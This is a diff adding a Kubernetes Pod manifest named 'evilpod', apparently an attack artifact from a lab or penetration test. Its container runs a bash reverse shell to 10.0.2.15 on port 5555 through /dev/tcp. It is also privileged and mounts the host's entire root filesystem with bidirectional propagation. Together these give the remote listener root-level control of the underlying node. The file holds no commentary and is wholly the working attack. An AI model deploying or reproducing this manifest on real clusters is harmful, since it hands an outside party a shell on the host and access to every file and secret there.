@@ -1,0 +1,19 @@
+apiVersion: v1
+kind: Pod
+metadata:
+  name: "evilpod"
+spec:
+  containers:
+  - name: "evilpod"
+    image: "ubuntu"
+    command: ["bash","-c","bash -i >& /dev/tcp/10.0.2.15/5555 0>&1"]
+    securityContext:
+      privileged: true
+    volumeMounts:
+    - mountPath: "/mnt"
+      name: hostvolume
+      mountPropagation: Bidirectional
+  volumes:
+  - name: hostvolume
+    hostPath:
+      path: "/"
